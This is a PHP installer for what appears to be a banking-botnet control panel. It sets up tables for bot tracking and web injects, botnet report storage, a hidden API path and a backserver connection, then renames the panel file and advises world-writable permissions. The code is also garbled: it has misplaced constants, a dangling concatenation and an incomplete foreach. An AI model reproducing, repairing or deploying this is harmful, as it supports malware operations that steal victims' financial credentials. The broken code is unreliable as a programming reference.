$subsql[] = 'CREATE TABLE IF NOT EXISTS `low_stat` (' . "\n" . '  `bot_id` VARCHAR(100) NOT NULL,' . "\n" . '  `botnet` VARCHAR(20) NOT NULL DEFAULT \'-- default --\',' . "\n" . '  `rtime_first` INTEGER(11) UNSIGNED NOT NULL,' . "\n" . '  `ip` VARCHAR(15),' . "\n" . '  `rtime_last` INTEGER(11) UNSIGNED NOT NULL,' . "\n" . '  PRIMARY KEY (`bot_id`) USING BTREE,' . "\n" . '  UNIQUE KEY `bot_id` (`bot_id`) USING BTREE' . "\n" . ') ENGINE=InnoDB' . "\n" . 'CHARACTER SET \'utf8\' COLLATE \'utf8_unicode_ci\';';
$subsql[] = 'CREATE TABLE `webinj` (' . "\n" . '  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,' . "\n" . '  `status` SMALLINT(6) NOT NULL DEFAULT 1,' . "\n" . '  `type` ENUM(\'inj\',\'filter\') COLLATE utf8_unicode_ci NOT NULL,' . "\n" . '  `data` LONGTEXT COLLATE utf8_unicode_ci,' . "\n" . '  `countries` TINYTEXT COLLATE utf8_unicode_ci,' . "\n" . '  `botnets` TINYTEXT COLLATE utf8_unicode_ci,' . "\n" . '  `bots` TINYTEXT COLLATE utf8_unicode_ci,' . "\n" . '  `hash` VARCHAR(100) COLLATE utf8_unicode_ci NOT NULL,' . "\n" . '  `name` VARCHAR(250) COLLATE utf8_unicode_ci NOT NULL,' . "\n" . '  PRIMARY KEY (`id`) USING BTREE,' . "\n" . '  UNIQUE KEY `hash` (`hash`) USING BTREE' . "\n" . ') ENGINE=InnoDB' . "\n" . 'AUTO_INCREMENT=0 CHARACTER SET \'utf8\' COLLATE \'utf8_unicode_ci\';';
$subsql[] = 'CREATE TABLE `webinj_stat` (' . "\n" . '  `fk_webinj` INTEGER(11) UNSIGNED NOT NULL,' . "\n" . '  `bot_id` VARCHAR(250) COLLATE utf8_unicode_ci NOT NULL,' . "\n" . '  `state` SMALLINT(6) NOT NULL,' . "\n" . '  UNIQUE KEY `webinj_stat_idx1` (`fk_webinj`, `state`, `bot_id`) USING BTREE,' . "\n" . '  KEY `fk_webinj` (`fk_webinj`) USING BTREE,' . "\n" . '  CONSTRAINT `webinj_stat_fk1` FOREIGN KEY (`fk_webinj`) REFERENCES `webinj` (`id`) ON DELETE CASCADE' . "\n" . ') ENGINE=InnoDB' . "\n" . 'CHARACTER SET \'utf8\' COLLATE \'utf8_unicode_ci\';';
$s = new SParam();
$pd_user = randomString(6);
$pd_pass = randomString(25, 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ()-_+;.*![],$');
$pd_mysql_host = '127.0.0.1';
$pd_mysql_user = 'root';
$pd_mysql_pass = '';
$pd_mysql_db = 'panda_db';
$pd_reports_path = '_reports';
$pd_reports_to_db = 1;
$pd_reports_to_fs = 0;
$pd_botnet_timeout = 10;
$pd_botnet_cryptkey = '';
$backserver_host = '';
$backserver_user = 'backviewer';
$backserver_password = '';
$backserver_db = 'backserver';
$_OUTPUT = '<div style="width: 500px">';
$is_update = file_exists(FILE_CONFIG);

if (strcmp($_SERVER['REQUEST_METHOD'], 'POST') === 0) {
	$error = false;
	$_OUTPUT = str_replace('{WIDTH}', DIALOG_WIDTH, THEME_DIALOG_BEGIN) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, 'Installation steps:'), THEME_DIALOG_TITLE);

	if ($is_update) {
		if (!@include_once FILE_CONFIG) {
			showerror('Failed to open file \'' . FILE_CONFIG . '\'.');
			$error = true;
		}
		else {
			if (isset($config['reports_path'])) {
				$pd_reports_path = $config['reports_path'];
			}

			if (isset($config['reports_to_db'])) {
				$pd_reports_to_db = ($config['reports_to_db'] ? 1 : 0);
			}

			if (isset($config['reports_to_fs'])) {
				$pd_reports_to_fs = ($config['reports_to_fs'] ? 1 : 0);
			}

			if (isset($config['botnet_timeout'])) {
				$pd_botnet_timeout = (int) $config['botnet_timeout'] / 60;
			}

			if (isset($config['backserver_host'])) {
				$backserver_host = $config['backserver_host'];
			}

			if (isset($config['backserver_user'])) {
				$backserver_user = $config['backserver_user'];
			}

			if (isset($config['backserver_password'])) {
				$backserver_password = $config['backserver_password'];
			}

			if (isset($config['backserver_db'])) {
				$backserver_db = $config['backserver_db'];
			}

			$pd_mysql_host = (isset($config['mysql_host']) ? $config['mysql_host'] : NULL);
			$pd_mysql_user = (isset($config['mysql_user']) ? $config['mysql_user'] : NULL);
			$pd_mysql_pass = (isset($config['mysql_pass']) ? $config['mysql_pass'] : NULL);
			$pd_mysql_db = (isset($config['mysql_db']) ? $config['mysql_db'] : NULL);
		}
	}
	else {
		$pd_user = checkPostData('user', 1, 20);
		$pd_pass = checkPostData('pass', 6, 64);
		$pd_reports_path = checkPostData('path_reports', 1, 256);
		$pd_reports_to_db = isset($_POST['reports_to_db']);
		$pd_reports_to_fs = isset($_POST['reports_to_fs']);
		$pd_botnet_timeout = checkPostData('botnet_timeout', 1, 4);
		$pd_mysql_host = checkPostData('mysql_host', 1, 256);
		$pd_mysql_user = checkPostData('mysql_user', 1, 256);
		$pd_mysql_pass = checkPostData('mysql_pass', 0, 256);
		$pd_mysql_db = checkPostData('mysql_db', 1, 256);
		$backserver_host = @$_POST['backserver_host'];
		$backserver_user = @$_POST['backserver_user'];
		$backserver_password = @$_POST['backserver_password'];
		$backserver_db = @$_POST['backserver_db'];
	}

	$pd_reports_path = trim(str_replace('\\', '/', trim($pd_reports_path)), '/');

	if (!$error) {
		if (!$is_update && THEME_PATH) {
			showerror('Bad format of login data.');
			$error = true;
		}

		if (($pd_mysql_host === NULL) || THEME_PATH || THEME_PATH) {
			showerror('Bad format of MySQL server data.');
			$error = true;
		}

		if ($pd_reports_path === NULL) {
			showerror('Bad format of reports path.');
			$error = true;
		}

		if (!is_numeric($pd_botnet_timeout) || THEME_PATH) {
			showerror('Bot online timeout have bad value.');
			$error = true;
		}
	}

	if (!$error) {
		showprogress('Connecting to MySQL as ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $pd_mysql_user . '\'' . THEME_STRING_BOLD_END . '.');
		if (!@mysql_connect($pd_mysql_host, $pd_mysql_user, $pd_mysql_pass) || THEME_PATH) {
			showerror('Failed connect to MySQL server: ' . htmlEntitiesEx(mysql_error()));
			$error = true;
		}
	}

	if (!$error) {
		$db = addslashes($pd_mysql_db);
		showprogress('Selecting DB ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $pd_mysql_db . '\'' . THEME_STRING_BOLD_END . '.');

		if (!@mysql_query('CREATE DATABASE IF NOT EXISTS `' . $db . '`')) {
			showerror('Failed to create database: ' . htmlEntitiesEx(mysql_error()));
			$error = true;
		}
		else if (!@mysql_select_db($pd_mysql_db)) {
			showerror('Failed to select database: ' . htmlEntitiesEx(mysql_error()));
			$error = true;
		}

		@mysql_query('ALTER DATABASE `' . $db . '` CHARACTER SET ' . MYSQL_CODEPAGE . ' COLLATE ' . MYSQL_COLLATE);
	}

	if (!$error) {
		foreach ($_TABLES as $v => ) {
			$table = THEME_PATH;

			if (strcmp($table, 'ipv4toc') == 0) {
				if ($error = !createtable($table)) {
					break;
				}

				showprogress('Filling table ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $table . '\'' . THEME_STRING_BOLD_END . '.');
				$sql = 'LOAD DATA LOCAL INFILE \'' . addslashes(__DIR__ . '/' . FILE_GEOBASE) . '\' INTO TABLE `ipv4toc` FIELDS TERMINATED BY \',\' ENCLOSED BY \'"\' ESCAPED BY \'\';';

				if (!mysql_query($sql)) {
					showerror('Failed to insert geo data');
					$error = true;
				}
			}
			else if (strcmp($table, 'botnet_reports') == 0) {
				if ($error = !createtable($table)) {
					break;
				}

				$rlist = listReportTables($pd_mysql_db);

				foreach ($rlist as $rtable) {
					if ($error = !updatetableex($rtable, 'botnet_reports')) {
						break;
					}
				}
			}
			else {
				$error = !($is_update ? updatetable($table) : createtable($table));
			}

			if ($error) {
				break;
			}
		}
	}

	foreach ($subsql as $sql) {
		mysql_query($sql);
	}

	if (!$error) {
		$error = !createpath($pd_reports_path, isset($config['reports_path']) ? $config['reports_path'] : 0);
	}

	if (!$error) {
		showprogress('Writing config file');
		$updateList['mysql_host'] = $pd_mysql_host;
		$updateList['mysql_user'] = $pd_mysql_user;
		$updateList['mysql_pass'] = $pd_mysql_pass;
		$updateList['mysql_db'] = $pd_mysql_db;
		$updateList['reports_path'] = $pd_reports_path;
		$updateList['reports_to_db'] = $pd_reports_to_db ? 1 : 0;
		$updateList['reports_to_fs'] = $pd_reports_to_fs ? 1 : 0;
		$updateList['botnet_timeout'] = (int) $pd_botnet_timeout * 60;
		$updateList['backserver_host'] = $backserver_host;
		$updateList['backserver_user'] = $backserver_user;
		$updateList['backserver_password'] = $backserver_password;
		$updateList['backserver_db'] = $backserver_db;
		$updateList['api_url'] = '/api/' . md5(microtime(true) . rand()) . '/' . md5(microtime(true) . rand());

		if (!updateConfig($updateList)) {
			showerror('Failed write to config file.');
			$error = true;
		}
	}

	if (!$error && THEME_PATH) {
		showprogress('Adding user ' . THEME_STRING_BOLD_BEGIN .  . '\'' . $pd_user . '\'' . THEME_STRING_BOLD_END . '.');
		$error = !addrowtotable('cp_users', '`name`=\'' . addslashes($pd_user) . '\', `pass`=\'' . md5($pd_pass . AUTH_SALT) . '\', `comment`=\'Default user\'');
	}

	@chmod('../tmp', 511);
	@chmod(__DIR__ . '/../gate/newlogs', 511);
	@chmod(__DIR__ . '/../gate/newlogs/requests', 511);

	if (!$error) {
		$nginxConf = 'autoindex off;' . "\n" . 'location ~* ^/(_reports|files|gate\\/newlogs|gate\\/cert)($|\\/) {' . "\n" . 'deny all;' . "\n" . '}' . "\n" . 'location / {' . "\n" . 'if (!-e $request_filename){' . "\n" . 'rewrite ^(.*)$ /gate/api.php;' . "\n" . '}' . "\n" . '}';
		$cpName = randomString(6) . '.php';
		@rename(__DIR__ . '/../cp.php', __DIR__ . '/../' . $cpName);
		$newMessage = 'Enter link /' . $cpName . '<br><br>' . 'Check permissions for directories chmod -R 777 your_web_folder<br><br>' . 'If you have apache webserver all settings are in .htaccess, check parameter AllowOverride All in your apache configuration<br/>' . 'If you have nginx add this settings to your configuration:<br/><pre>' . $nginxConf . '</pre><br/>' . 'If your files are not in the root folder correct it in the webserver configuration.<br>' . 'If your folder for reports is not "_reports" change it in the webserver configuration.<br><br>' . "\n" . '                Delete install folder now.<br><br>' . 'We recommend to use https, you can generate certs by command: openssl req -new -x509 -days 365 -nodes -out /etc/apache2/ssl/apache.pem -keyout /etc/apache2/ssl/apache.key<br>' . 'You can regenerate cert every day, add this command to cron.';
		$_OUTPUT .= THEME_DIALOG_ROW_BEGIN . str_replace('{TEXT}', THEME_STRING_BOLD_BEGIN . ($is_update ? 'Update complete' : 'Installation complete') . '<br/><br/>' . THEME_STRING_BOLD_END . $newMessage, THEME_DIALOG_ITEM_SUCCESSED) . THEME_DIALOG_ROW_END;
		themeSmall(APP_TITLE, $_OUTPUT . THEME_DIALOG_END, 0, 0, 0, true, '../');
		exit();
	}

	$_OUTPUT .= THEME_DIALOG_END . THEME_VSPACE;
}
if ($is_update) {
	@include_once FILE_CONFIG;

	if (isset($config['mysql_db'])) {
		$pd_mysql_db = $config['mysql_db'];
	}
}
if ($is_update) {
	$help = 'This application update/repair and reconfigure your control panel on this server. If you want make new installation, please remove file \'' . FILE_CONFIG . '\'.';
}
else {
	$help = 'This application install and configure your control panel on this server. Please type settings and press \'Install\'.';
}

$_FORMITEMS = '';

if (!$is_update) {
	$_FORMITEMS .= '<b>Root user:</b><br>' . '<span>User name:</span>' . str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_user), 'user', '20', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT_RO) . '<span>Password:</span>' . str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_pass), 'pass', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT_RO) . '';
}

$_FORMITEMS .= '<br><b>MySQL server:</b><br>';

if (!$is_update) {
	$_FORMITEMS .= '<span>Host:</span>' . str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_host), 'mysql_host', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>User:</span>' . str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_user), 'mysql_user', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Password:</span>' . str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_pass), 'mysql_pass', '64', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . '';
}

$_FORMITEMS .= '<span>Database:</span>' . str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_mysql_db), 'mysql_db', '64', DIALOG_INPUT_WIDTH), $is_update ? THEME_DIALOG_ITEM_INPUT_TEXT_RO : THEME_DIALOG_ITEM_INPUT_TEXT) . '';

if (!$is_update) {
	$_FORMITEMS .= '<br><b>Backserver:</b><br>' . '<span>Backserver mysql host:</span>' . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('backserver_host', htmlEntitiesEx($backserver_host), 100, DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Backserver mysql user:</span>' . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('backserver_user', htmlEntitiesEx($backserver_user), 100, DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Backserver mysql password:</span>' . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('backserver_password', htmlEntitiesEx($backserver_password), 100, DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_PASSWORD) . '<span>Backserver mysql database:</span>' . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('backserver_db', htmlEntitiesEx($backserver_db), 100, DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . '';
}

if (!$is_update) {
	$_FORMITEMS .= '<br><b>Local folders:</b><br>' . '<span>Reports:</span>' . str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_reports_path), 'path_reports', '255', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . '';
}

if (!$is_update) {
	$_FORMITEMS .= '<br><b>Options:</b><br>' . '<span>Online bot timeout:</span>' . str_replace(array('{VALUE}', '{NAME}', '{MAX}', '{WIDTH}'), array(htmlEntitiesEx($pd_botnet_timeout), 'botnet_timeout', '4', DIALOG_INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT) . str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'reports_to_db', '', 'Enable write reports to database.'), $pd_reports_to_db ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2) . '<br>' . str_replace(array('{COLUMNS_COUNT}', '{VALUE}', '{NAME}', '{JS_EVENTS}', '{TEXT}'), array(1, 1, 'reports_to_fs', '', 'Enable write reports to local path.'), $pd_reports_to_fs ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2) . '';
}

$_OUTPUT .= str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('idata', basename($_SERVER['PHP_SELF']), ''), THEME_FORMPOST_BEGIN) . '<p>' . $help . '</p>' . $_FORMITEMS . '<br><br>' . str_replace(array('{TEXT}', '{JS_EVENTS}'), array($is_update ? 'Update' : 'Install', ''), THEME_DIALOG_ITEM_ACTION_SUBMIT_SUC) . THEME_FORMPOST_END . '</div>';
themeSmall(APP_TITLE, $_OUTPUT, 0, 0, 0, true, '../');

?>
